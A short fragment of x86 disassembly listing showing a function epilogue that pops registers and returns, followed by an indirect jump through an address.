  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
